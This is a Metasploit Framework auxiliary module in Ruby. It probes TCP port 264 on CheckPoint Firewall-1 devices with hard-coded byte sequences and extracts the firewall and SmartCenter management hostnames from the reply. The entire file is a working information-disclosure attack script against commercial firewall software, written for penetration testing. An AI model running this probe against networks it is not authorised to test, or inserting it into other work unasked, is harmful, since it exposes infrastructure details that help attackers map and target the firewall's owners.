##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'CheckPoint Firewall-1 Topology Service Hostname Disclosure',
			'Description'    => %q{
				This module sends a query to the TCP port 264 on CheckPoint
				firewalls to obtain the firewall name and management station
				(such as SmartCenter) name.
			},
			'Author'         => [ 'patrick' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					# patrickw - None? Stumbled across, probably an old bug/feature but unsure.
					[ 'URL', 'http://www.osisecurity.com.au/advisories/' ],
				]
		))

		register_options(
			[
				Opt::RPORT(264),
			], self.class)
	end

	def autofilter
		false
	end

	def run
		print_status("Attempting to contact Checkpoint FW1 Topology service...")
		connect

		sock.put("\x51\x00\x00\x00")
		sock.put("\x00\x00\x00\x21")
		res = sock.get(4)
		if (res == "Y\x00\x00\x00")
			print_good("Appears to be a CheckPoint Firewall...")
			sock.put("\x00\x00\x00\x0bsecuremote\x00")
			res = sock.get_once
			if (res =~ /CN\=(.+),O\=(.+)\./i)
				print_good("Firewall Host: #{$1}")
				print_good("SmartCenter Host: #{$2}")
			end
		else
			print_error("Unexpected response:\r\n#{res}")
		end

		disconnect
	end

end
